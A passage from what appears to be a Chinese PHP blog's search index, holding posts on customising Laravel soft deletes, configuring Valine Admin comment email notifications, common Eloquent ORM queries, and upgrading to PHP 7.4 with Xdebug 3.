Laravel中使用了一个日期字段作为标识状态，deleted_at 默认值为NULL，如果记录被删除了，deleted_at 的值则为当前时间戳，所以只能通过is null or not is null查询一条记录是否被删除，这会导致Mysql 引擎放弃使用索引而进行全表扫描，查询效率可想而知。 可以通过重写SoftDeletes.php 类来修改Laravel SoftDelete 的逻辑： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;?phpnamespace App\\Models\\Traits;use Illuminate\\Database\\Eloquent\\SoftDeletes;trait SoftDeletesEx &#123; use SoftDeletes; /** * Boot the soft deleting trait for a model. * * @return void */ public static function bootSoftDeletes() &#123; static::addGlobalScope(new SoftDeletingScopeEx()); &#125; /** * Get the name of the \"deleted at\" column. * * * @return string */ public function getDeletedAtColumn() &#123; // 自定义标识字段 return 'is_deleted'; &#125; /** * Perform the actual delete query on this model instance. * * @return void */ protected function runSoftDelete() &#123; $query = $this-&gt;newQueryWithoutScopes()-&gt;where($this-&gt;getKeyName(), $this-&gt;getKey()); // 0. 正常 1. 已删除 $this-&gt;&#123;$this-&gt;getDeletedAtColumn()&#125; = $time = 1; $query-&gt;update([ $this-&gt;getDeletedAtColumn() =&gt; $time ]); &#125; /** * Restore a soft-deleted model instance. * * @return bool|null */ public function restore() &#123; // If the restoring event does not return false, we will proceed with this // restore operation. Otherwise, we bail out so the developer will stop // the restore totally. We will clear the deleted timestamp and save. if ($this-&gt;fireModelEvent('restoring') === false) &#123; return false; &#125; $this-&gt;&#123;$this-&gt;getDeletedAtColumn()&#125; = 0; // Once we have saved the model, we will fire the \"restored\" event so this // developer will do anything they need to after a restore operation is // totally finished. Then we will return the result of the save call. $this-&gt;exists = true; $result = $this-&gt;save(); $this-&gt;fireModelEvent('restored', false); return $result; &#125; /** * Determine if the model instance has been soft-deleted. * * @return bool */ public function trashed() &#123; return ! ($this-&gt;&#123;$this-&gt;getDeletedAtColumn()&#125; === 0); &#125;&#125; 通过定义is_deleted 字段来标示是否删除，默认值0. 未删除，1. 已删除，同时给该字段添加普通索引。 接着还需要重写SoftDeletingScope.php 类，约束默认查询is_deleted = 0 的记录： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192&lt;?phpnamespace App\\Models\\Traits;use Illuminate\\Database\\Eloquent\\Builder;use Illuminate\\Database\\Eloquent\\Model;use Illuminate\\Database\\Eloquent\\SoftDeletingScope;class SoftDeletingScopeEx extends SoftDeletingScope &#123; /** * 将约束加到 Eloquent 查询构造中，这样默认查询的就是 `is_deleted` = 0 的记录了 * Apply the scope to a given Eloquent query builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @param \\Illuminate\\Database\\Eloquent\\Model $model * @return void */ public function apply(Builder $builder, Model $model) &#123; $builder-&gt;where($model-&gt;getQualifiedDeletedAtColumn(), 0); &#125; /** * Extend the query builder with the needed functions. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ public function extend(Builder $builder) &#123; foreach ($this-&gt;extensions as $extension) &#123; $this-&gt;&#123;\"add&#123;$extension&#125;\"&#125;($builder); &#125; $builder-&gt;onDelete(function (Builder $builder) &#123; $column = $this-&gt;getDeletedAtColumn($builder); return $builder-&gt;update([ $column =&gt; \\DB::Raw('UNIX_TIMESTAMP(NOW())') ]); &#125;); &#125; /** * Add the restore extension to the builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ protected function addRestore(Builder $builder) &#123; $builder-&gt;macro('restore', function (Builder $builder) &#123; $builder-&gt;withTrashed(); return $builder-&gt;update([ $builder-&gt;getModel() -&gt;getDeletedAtColumn() =&gt; 0 ]); &#125;); &#125; /** * Add the without-trashed extension to the builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ protected function addWithoutTrashed(Builder $builder) &#123; $builder-&gt;macro('withoutTrashed', function (Builder $builder) &#123; $model = $builder-&gt;getModel(); $builder-&gt;withoutGlobalScope($this) -&gt;where($model-&gt;getQualifiedDeletedAtColumn(), 0); return $builder; &#125;); &#125; /** * Add the only-trashed extension to the builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ protected function addOnlyTrashed(Builder $builder) &#123; $builder-&gt;macro('onlyTrashed', function (Builder $builder) &#123; $model = $builder-&gt;getModel(); $builder-&gt;withoutGlobalScope($this) -&gt;where($model-&gt;getQualifiedDeletedAtColumn(), '&lt;&gt;', 0); return $builder; &#125;); &#125;&#125; 最后应用到Model 中： 1234567891011121314&lt;?phpnamespace App\\Models;use Illuminate\\Database\\Eloquent\\Model;use App\\Models\\Traits\\SoftDeletesEx;class User extends Model&#123; use SoftDeletesEx; protected $table = 'user'; protected $dates = [\"is_deleted\"];&#125; 参考链接 laravel框架自定义软删除 Laravel5软删除（SoftDeletes）的deleted_at改造","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Valine 如何开启评论邮件通知","slug":"how-does-valine-turn-on-comment-email-notifications","date":"2021-04-05T12:22:51.000Z","updated":"2021-04-05T12:23:45.789Z","comments":true,"path":"how-does-valine-turn-on-comment-email-notifications/","link":"","permalink":"https://www.0x2beace.com/how-does-valine-turn-on-comment-email-notifications/","excerpt":"事情是这样的，昨天无意在博客上看到一条留言，留言时间是两天之前，我才意识到目前的评论系统缺少通知 =_=!。","text":"事情是这样的，昨天无意在博客上看到一条留言，留言时间是两天之前，我才意识到目前的评论系统缺少通知 =_=!。 没有通知这怎么能行呢？因为我用的是一款叫做Valine 的评论系统，马上Google 了一下，于是有了这篇笔记。 所以这篇笔记的内容，可能不适用其他评论系统。 Valine Admin 是 Valine 评论系统的后端功能补充和增强，主要实现评论邮件通知、评论管理、垃圾评论过滤等功能。支持完全自定义的邮件通知模板，基于Akismet API实现准确的垃圾评论过滤。 在正式开始之前，首先得注册一个LeanCloud 账号。 LeanCloud 是什么？ 它是一站式后端云服务提供商，到时候我们的评论系统就是要部署在这个云服务上。 创建云引擎注册成功之后，进入控制台，新建一个应用： 选择开发板就好。 然后进入刚创建好的应用，依次点击设置=&gt; 应用Key，可以看到AppID 和AppKey，这两个东西很重要， 打开博客主题的配置文件，在对应的位置分别填上appId和appKey： 下一步需要绑定域名，这里需要绑定的域名，就是你的博客的域名，国内版可能有多个域名绑定供选，这里选择云引擎就好。 到时候这个域名就是进入我们的评论系统的入口。 需要先完成CNAME 域名解析，绑定才会生效。 进入你的域名管理后台，添加一条CNAME 记录，主机名称就是刚才绑定的子域名。 域名解析没那么快，等待的时间可以开始配置云引擎。 进入云引擎=&gt;设置，添加云引擎环境变量： 变量 示例 说明 SITE_NAME Boo’s Blog [必填]博客名称 SITE_URL https://0x2beace.com [必填]首页地址 SMTP_SERVICE QQ [新版支持]邮件服务提供商，支持 QQ、163、126、Gmail 以及 更多 SMTP_USER xxxxxx@qq.com [必填]SMTP登录用户 SMTP_PASS ccxxxxxxxxch [必填]SMTP登录密码 SENDER_NAME Boo [必填]发件人 SENDER_EMAIL xxxxxx@qq.com [必填]发件邮箱 ADMIN_URL https://xxx.0x2beace.com/ [建议]Web主机二级域名（云引擎域名），用于自动唤醒 BLOGGER_EMAIL xxxxx@gmail.com [可选]博主通知收件地址，默认使用SENDER_EMAIL AKISMET_KEY xxxxxxxx [可选]Akismet Key 用于垃圾评论检测，设为MANUAL_REVIEW开启人工审核，留空不使用反垃圾 点击保存之后，切换到云引擎=&gt;部署，部署模式选择部署项目-Git部署，分支master，手动部署目标环境为生产环境，Git 仓库填入：https://github.com/DesertsP/Valine-Admin.git，点击部署即可。 评论管理注册管理员如果这时域名解析已经完成，那么访问：https://云引擎域名/，应该可以看到如下界面： 这是还没有管理员账号，需要先通过https://云引擎域名/sign-up/注册一个。 至此就已经可以管理我们的评论了，但是目前还没有邮件通知。 设置定时任务这里设置定时任务的目的就是，每天定时检查是否存在漏发的邮件。 进入云引擎=&gt; 定时任务，创建两个定时任务： 选择self-wake云函数，Cron表达式为0 */30 0-16 * * ?，表示每天早0点到晚16点每隔30分钟访问云引擎。 选择resend-mails云函数，Cron表达式为0 0 0 * * ?，表示每天0点检查过去24小时内漏发的通知邮件并补发。 邮件通知模版(可选配置)邮件通知模板在云引擎环境变量中设定，可自定义通知邮件标题及内容模板。 环境变量 示例 说明 MAIL_SUBJECT ${PARENT_NICK}，您在${SITE_NAME}上的评论收到了回复 [可选]@通知邮件主题（标题）模板 MAIL_TEMPLATE 见下文 [可选]@通知邮件内容模板 MAIL_SUBJECT_ADMIN ${SITE_NAME}上有新评论了 [可选]博主邮件通知主题模板 MAIL_TEMPLATE_ADMIN 见下文 [可选]博主邮件通知内容模板 邮件通知包含两种，分别是被@通知和博主通知，这两种模板都可以完全自定义。默认使用经典的蓝色风格模板（样式来源未知）。 默认被@通知邮件内容模板如下： 1&lt;div style&#x3D;&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;您在&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt; $&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;上的评论有了新的回复&lt;&#x2F;h2&gt; $&#123;PARENT_NICK&#125; 同学，您曾发表评论：&lt;div style&#x3D;&quot;padding:0 12px 0 12px;margin-top:18px&quot;&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;PARENT_COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;&#x2F;strong&gt;回复说：&lt;&#x2F;p&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;您可以点击&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;POST_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;查看回复的完整內容&lt;&#x2F;a&gt;，欢迎再次光临&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;。&lt;br&gt;&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt; 默认博主通知邮件内容模板如下： 1&lt;div style&#x3D;&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;您在&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;上的文章有了新的评论&lt;&#x2F;h2&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;&#x2F;strong&gt;回复说：&lt;&#x2F;p&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;您可以点击&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;POST_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;查看回复的完整內容&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt; 这里有个问题就是部分变量不再可用，如果使用了未定义的变量，发送邮件时会抛出异常： 我选择去掉了部分变量，这就导致了邮件部分内容是缺失的： 这里没继续往下深究了，能用就行，至此就完成了所有配置。如果你遇到一些奇怪的问题，可以看看以下建议对你是否有用： 常见问题 LeanCloud 分国内版和国际版，如果你和我一样不喜欢域名备案，使用的是国际域名服务商提供的域名，那么注册LeanCloud 时，请选选择国际版。 域名解析如果长时间未生效，请检查添加CNAME 纪录，ttl 不要选择一小时，选择六百秒。 SMTP_PASS 不是QQ 邮箱的密码，而是SMTP服务的密钥，如果不知道如何获取，可以看这里。 修改完变量，需要重启应用，否者不会生效。 参考链接 Valine Admin Valine Admin 配置手册","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Laravel Eloquent ORM 常用操作整理","slug":"laravel-eloquent-orm-common-operations-finishing","date":"2021-04-04T01:22:30.000Z","updated":"2021-04-04T01:23:43.318Z","comments":true,"path":"laravel-eloquent-orm-common-operations-finishing/","link":"","permalink":"https://www.0x2beace.com/laravel-eloquent-orm-common-operations-finishing/","excerpt":"Laravel 支持原生的 SQL 查询、流畅的查询构造器 和 Eloquent ORM 三种查询方式：","text":"Laravel 支持原生的 SQL 查询、流畅的查询构造器 和 Eloquent ORM 三种查询方式： 流畅的查询构造器（简称DB），它是为创建和运行数据库查询提供的一个接口，支持大部分数据库操作，和手写SQL 的本质是一样的。 Eloquent ORM（简称ORM），是一个对象关系映射(Object Relational Mapper)工具，通过建立模型与数据表进行交互，它会把数据库中的数据映射成对象和集合对象，无需接触底层数据，可以直接调用映射出来的对象进行开发。 这篇笔记主要来整理下常用的ORM 操作。 查询artisan tinker 是 Laravel 框架自带的命令，用以调出 Laravel 的交互式运行时，Eloquent ORM 的代码可以直接在该环境中运行。 查询列表获取所有数据： 12use App\\Models\\User;$users &#x3D; User::all(); 如果只需要部分字段，有两种方式进行限定： 123$users &#x3D; User::all([&quot;id&quot;, &quot;name&quot;]);$users &#x3D; User::select(&quot;id&quot;, &quot;name&quot;)-&gt;get(); 获取单列： 12$name &#x3D; User::pluck(&#39;name&#39;);&#x2F;&#x2F; [&quot;boo&quot;, &quot;mac&quot;, &quot;yumi&quot;] 还可以在返回的集合中指定字段的自定义键名，注意：该自定义键必须是该表的其它字段列名，否则会报错： 12$name &#x3D; User::pluck(&#39;email&#39;,&#39;name&#39;);&#x2F;&#x2F; [&quot;boo&quot; &#x3D;&gt; &quot;boo@example.com&quot;, &quot;yumi&quot; &#x3D;&gt; &quot;yumi@example.com&quot;] 查询单条数据1234567891011121314&#x2F;&#x2F; 通过主键获取模型$user &#x3D; User:;find(1);&#x2F;&#x2F; 获取匹配查询条件的第一个模型$user &#x3D; User::where(&#39;is_enable&#39;, 1)-&gt;first();&#x2F;&#x2F; 获取第一条数据的指定列值$user &#x3D; User::value(&quot;name&quot;); &#x2F;&#x2F; 返回结果是字符串：boo&#x2F;&#x2F; 传递主键数组来调用 find 方法，返回匹配记录集合$user &#x3D; User::find([1,2,3]); &#x2F;&#x2F; 等同于 $user &#x3D; User::whereIn(&quot;id&quot;, [1,2,3])-&gt;get(); 处理返回结果集Eloquent ORM 查询返回值是 Illuminate\\Database\\EloquentCollection 的一个实例，所以除了可以使用传统的数组方式进行遍历，还可以使用集合方式进行遍历。 chunkchunk方法可以把大的结果集分成小块查询，例如，我们可以将全部User 表数据切割成一次处理 5 条记录的一小块： 123456$result &#x3D; User::chunk(5, function ($users) &#123; foreach ($users as $user) &#123; echo $user-&gt;name.PHP_EOL; &#125;&#125;);&#x2F;&#x2F; result 为 boolean 在User表中一共有14条数据，通过查看查询日志，可以看到chunk 分了三次查询 ： each如果想对一个集合中的每一项都进行一些操作，但不修改集合本身，则可以使用each： 12345$users &#x3D; User::all();$users &#x3D; $users-&gt;each(function ($user , $key) &#123; $user-&gt;password &#x3D; bcrypt(122410);&#125;);&#x2F;&#x2F; 返回结果包含完整的User模型，其中password 字段的值被修改 map如果想对集合中的所有元素进行迭代，对它们进行修改，并返回包含修改的新集合，那么需要使用map： 12345678$users &#x3D; User::all();$users &#x3D; $users-&gt;map(function ($user, $key) &#123; return [ &quot;name&quot; &#x3D;&gt; $user-&gt;name, &quot;password&quot; &#x3D;&gt; bcrypt(122410), ];&#125;);&#x2F;&#x2F; 返回结果仅包含name 和password 字段，其中password 字段的值被修改 聚合方法123456&#x2F;&#x2F; 统计总数$count &#x3D; User::count();&#x2F;&#x2F; 统计分组$count &#x3D; User::select(User::raw(&quot;count(id) as aggregate&quot;))-&gt;groupBy(&quot;is_enable&quot;)-&gt;get();&#x2F;&#x2F; 注意不能这样写：User::select(&#39;count(id) as aggregate&#39;)-&gt;groupBy(&quot;is_enable&quot;)-&gt;get(); 条件查询构建复杂查询： 12345678910111213141516171819202122232425262728&#x2F;&#x2F; 组合查询方式一$where &#x3D; [];$where[] &#x3D; [&quot;is_enable&quot;, 1];$where[] &#x3D; [ function($query)&#123; $query-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 10) -&gt;orWhere(&quot;name&quot;, &quot;like&quot;, &quot;%admin%&quot;);&#125;];User::select(&quot;id&quot;, &quot;name as username&quot;, &quot;email&quot;)-&gt;where($where)-&gt;get(); &#x2F;&#x2F; 组合查询方式二$builder &#x3D; User::select(&quot;id&quot;, &quot;name as username&quot;, &quot;email&quot;);$builder-&gt;where(&quot;is_enable&quot;, 1);$builder-&gt;where(function ($query)&#123; $query-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 10) -&gt;orWhere(&quot;name&quot;, &quot;like&quot;, &quot;%admin%&quot;);&#125;);$users &#x3D; $builder-&gt;get();&#x2F;&#x2F; 两种方式的查询SQL 是一样的： select &#96;id&#96;, &#96;name&#96; as &#96;username&#96;, &#96;email&#96; from &#96;users&#96; where (&#96;is_enable&#96; &#x3D; &#39;1&#39; and (&#96;id&#96; &gt; &#39;10&#39; or &#96;name&#96; like &#39;%admin%&#39;))&#x2F;&#x2F; Where Exists$builder &#x3D; User::select(&quot;id&quot;, &quot;name&quot;, &quot;email&quot;);$builder-&gt;whereExists(function ($query)&#123; $query-&gt;select(User::raw(&quot;title&quot;)) -&gt;from(&quot;topics&quot;) -&gt;whereRaw(&quot;topics.user_id &#x3D; users.id&quot;);&#125;); 排序1234567891011&#x2F;&#x2F; 用户id 倒序$user &#x3D; User::orderBy(&quot;id&quot;, &quot;desc&quot;)-&gt;get();&#x2F;&#x2F; 获取created_at 最大的一条记录$user &#x3D; User::latest()-&gt;first();&#x2F;&#x2F; 获取created_at 最小的一条记录$user &#x3D; User::oldest()-&gt;first();&#x2F;&#x2F; 随机一条记录$users &#x3D; User::inRandomOrder()-&gt;first(); 限定123456&#x2F;&#x2F; 跳过前两条记录，取三条记录$users &#x3D; User::skip(2)-&gt;take(3)-&gt;get();&#x2F;&#x2F; 输出SQL：select * from &#96;users&#96; limit 3 offset 2 &#x2F;&#x2F; 同上$users &#x3D; User::offset(2)-&gt;limit(3)-&gt;get(); 其他1234567&#x2F;&#x2F; 使用别名$user &#x3D; User::select(&quot;name as username&quot;, &quot;id&quot;)-&gt;first();&#x2F;&#x2F; 创建一个查询构建器$builder &#x3D; User::select(&quot;name&quot;);&#x2F;&#x2F; 添加一个查询列到已存在的 select 子句$user &#x3D; $builder-&gt;addSelect(&quot;id&quot;)-&gt;first(); 分页12$users &#x3D; User::paginate(10);$users &#x3D; User::simplePaginate(10); paginate 方法，返回Illuminate\\Pagination\\LengthAwarePaginator实例 simplePaginate 方法，返回Illuminate\\Pagination\\Paginator实例 每个分页器实例都可以通过以下方法提供更多分页信息： 1234567891011$result-&gt;count() &#x2F;&#x2F; 当前页条数 $result-&gt;currentPage() &#x2F;&#x2F; 当前页码$result-&gt;perPage() &#x2F;&#x2F; 每页多少条$result-&gt;total() &#x2F;&#x2F; 总数(使用simplePaginate 时无效)$result-&gt;hasMorePages() &#x2F;&#x2F; 是否有更多$result-&gt;firstItem() $result-&gt;lastItem()$result-&gt;lastPage() (使用simplePaginate 时无效)$result-&gt;nextPageUrl()$result-&gt;previousPageUrl()$result-&gt;url($page) 插入1234567891011121314151617181920$user &#x3D; new User();$user-&gt;name &#x3D; &quot;yumi&quot;;$user-&gt;fill([&quot;email&quot; &#x3D;&gt; &quot;yumi@example.com&quot;]);$user-&gt;save();&#x2F;&#x2F; 返回模型对象$result &#x3D; User::create( [&quot;name&quot;&#x3D;&gt;&quot;boo&quot;, &#39;email&#39; &#x3D;&gt; &#39;boo@example.com&#39;]);&#x2F;&#x2F; 返回模型对象$result &#x3D; User::insert( [&quot;name&quot;&#x3D;&gt;&quot;boo&quot;, &#39;email&#39; &#x3D;&gt; &#39;boo@example.com&#39;]);&#x2F;&#x2F; 返回Boolean$result &#x3D; User::insertGetId( [&quot;name&quot;&#x3D;&gt;&quot;boo&quot;, &#39;email&#39; &#x3D;&gt; &#39;boo@example.com&#39;]);&#x2F;&#x2F; 返回插入记录对应ID 更新单个更新 1234567$user &#x3D; User::find(1);$user-&gt;name &#x3D; &#39;yumi&#39;;$user-&gt;save();&#x2F;&#x2F; 返回Boolean$user &#x3D; User::where(&quot;id&quot;, 1)-&gt;update([&#39;password&#39; &#x3D;&gt; bcrypt(122410)]);&#x2F;&#x2F; 返回受影响行数 批量更新： 12$user &#x3D; User::whereIn(&quot;id&quot;, [1,2,3])-&gt;update([&#39;password&#39; &#x3D;&gt; bcrypt(122410)]); &#x2F;&#x2F; 返回受影响行数 删除单个删除 12345678910&#x2F;&#x2F; 通过主键查询，删除模型$user &#x3D; User::find(1);$user-&gt;delete();&#x2F;&#x2F; 返回Boolean&#x2F;&#x2F; 直接通过主键删除User::destroy(1);&#x2F;&#x2F; 返回受影响行数User::where(&#39;id&#39;, 1)-&gt;delete(); 批量删除： 1234567User::destroy([1, 2, 3]);User::destroy(1, 2, 3);&#x2F;&#x2F; 注：通过 Eloquent 批量删除时，deleting 和 deleted事件不会被触发，因为在进行模型删除时不会获取模型。User::whereIn(&#39;id&#39;, [1, 2, 3])-&gt;delete();&#x2F;&#x2F; 均返回受影响行数 软删除除了真实删除数据库记录，Eloquent 也可以「软删除」模型。软删除的模型并不是真的从数据库中删除了。 事实上，是在模型上设置了 deleted_at 属性并将其值写入数据库。如果 deleted_at 值非空，代表这个模型已被软删除。 如果要开启模型软删除功能，需要在模型上使用 Illuminate\\Database\\Eloquent\\SoftDeletes trait，同时需要添加 $dates 属性： 12345678910111213&lt;?phpnamespace App\\Models;use Illuminate\\Database\\Eloquent\\Model;use Illuminate\\Database\\Eloquent\\SoftDeletes;class User extends Model&#123; use SoftDeletes; protected $dates &#x3D; [&#39;deleted_at&#39;];&#125; 现在，当在模型实例上使用 delete 方法，当前日期时间会写入 deleted_at 字段。同时，查询出来的结果也会自动排除已被软删除的记录。 软删除常见操作12345678910111213&#x2F;&#x2F; 验证给定的模型实例是否已被软删除if ($user-&gt;trashed()) &#123; &#x2F;&#x2F;&#125;&#x2F;&#x2F; 包括已软删除的模型$users &#x3D; User::withTrashed()-&gt;get(); &#x2F;&#x2F; 只检索软删除模型 $users &#x3D; User::onlyTrashed()-&gt;get();&#x2F;&#x2F; 永久删除$user-&gt;forceDelete(); 注意⚠️： 通过 Eloquent 批量删除时，deleting 和 deleted 事件不会被触发，因为在进行模型删除时不会获取模型。 通过 Eloquent 批量更新时，更新的模型不会触发 saving, saved, updating 和 updated 模型事件。这是因为在批量更新时实际上从未检索模型。 参考链接 Eloquent 快速入门 Laravel 中Eloquent ORM 相关操作","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"谈谈第一次使用 Laravel 开发的感想","slug":"talk-about-the-feelings-of-using-laravel-development-for-the-first-time","date":"2021-04-03T04:36:54.000Z","updated":"2021-04-03T09:35:09.242Z","comments":true,"path":"talk-about-the-feelings-of-using-laravel-development-for-the-first-time/","link":"","permalink":"https://www.0x2beace.com/talk-about-the-feelings-of-using-laravel-development-for-the-first-time/","excerpt":"这篇笔记用来记录一下使用Laravel 开发的一些感想。","text":"这篇笔记用来记录一下使用Laravel 开发的一些感想。 笔者最早接触的第一个PHP 框架是ThinkPHP 3.2，写过接口，做过网站。 后来发现了Laravel 这个框架，那时最新的版本是5.x，当时就觉得这个框架可真高级，好多从未了解到的概念。 也正是从那个时候开始了解Laravel，通过learnku 上的系列课程进行学习， 前前后后也是花了不少时间在上面，始终没机会进入项目实战，一直停留在学习层面。 今年的第一个项目有幸使用Laravel 从零开发，当我再次捡起之前看过的课程，感觉几乎白看了，好多点完全都没印象了。 有幸遇到一位不错的项目组长，项目开发初期给了一些时间去做准备。 这一周是新项目正式开始的第一周，项目进展挺顺利的（没有拖后腿 😀），不得不说使用Laravel 开发的效率真的很高，丰富的第三方扩展包可以满足日常开发的绝大多数应用场景。 这不禁让我引发思考，为什么之前花更多的时间和精力去学习，却还没有这短短半个月的收获大呢？ 原因很简单：编程是技能，不是知识，技能只有在不断练习下才会有进步 。 借用一句老话来讲就是：纸上得来终觉浅，绝知此事要躬行。 现在再回头看看learnku.com 的站长，在介绍如何正确阅读本书时，说的一段话，真的特别好，强调“刻意练习”的重要性。 所以不能总是停留在学习阶段，有一定基础之后，就去做，遇到问题解决问题，不用太在意结果如何，动手去做就好了。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"},{"name":"一些思考","slug":"PHP/Laravel/一些思考","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"},{"name":"一些思考","slug":"一些思考","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}]},{"title":"记一次升级 PHP 引发的一些思考","slug":"some-thoughts-caused-by-upgrading-php-at-a-time","date":"2021-03-31T15:27:38.000Z","updated":"2021-04-03T04:39:35.526Z","comments":true,"path":"some-thoughts-caused-by-upgrading-php-at-a-time/","link":"","permalink":"https://www.0x2beace.com/some-thoughts-caused-by-upgrading-php-at-a-time/","excerpt":"因为工作原因，今天将本地开发环境的PHP 升级到7.4 了，此前一直使用7.3。 中间遇到了一些小问题，总体还算顺利，在此记录一下。","text":"因为工作原因，今天将本地开发环境的PHP 升级到7.4 了，此前一直使用7.3。 中间遇到了一些小问题，总体还算顺利，在此记录一下。 背景说明我并没有使用集成的开发环境，而是单独安装所需的5.6、7.0、7.1、7.2、7.3 版本，所以升级7.4 也很简单，直接使用brew 安装即可： 1$ brew install php@7.4 但是这会带来一个新的问题：之前通过源码编译安装过的扩展，还需要再安装一次。 你可能会问，为什么还需要再安装一次呢？直接把php.ini 中的开启扩展配拷贝过去不就可以了吗？ 我们来试试这样做会发生什么？ 可以看到 PHP 并没有正常加载该扩展，这是为啥呢？ 要回答这个问题，首先我们需要搞清楚，源码编译安装是怎么回事。 当我们执行phpize 命令后，会根据当前系统信息（PHP 版本）生成对应版本的扩展文件。 所以PHP7.3 编译生成的扩展自然就不能直接拿到PHP 7.4 中去使用了。 xdebug另外想说一下Xdebug ，它是我一直在使用的一个调试扩展，非常强大。 在PHP 升起到7.4 之后，我一并安装了最新版的Xdebug（3.x），此前我一直使用 2.x 版本的，因为版本跨度比较大，刚开始问题挺多的，断点总是进不去。 起初我认为是新旧配置不兼容，挺多参数名称发生了变化，（具体可以看这里），当我把配置全部切换成适应新版本，还是进不去。 后来阴差阳错升级了PHPStorm，结果就能调试了…（升级之前的版本是 2020.1） 适应xdebug 3.x的配置如下： 123456[XDebug]zend_extension&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pecl&#x2F;20190902&#x2F;xdebug.soxdebug.mode &#x3D; debugxdebug.client_host &#x3D; 127.0.0.1xdebug.client_port &#x3D; 9003xdebug.idekey&#x3D;PHPSTORM 只是到最后我也没整明白到底是啥原因导致。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"一些思考","slug":"PHP/一些思考","permalink":"https://www.0x2beace.com/categories/PHP/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"一些思考","slug":"一些思考","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}]},{"title":"『转载』Laravel 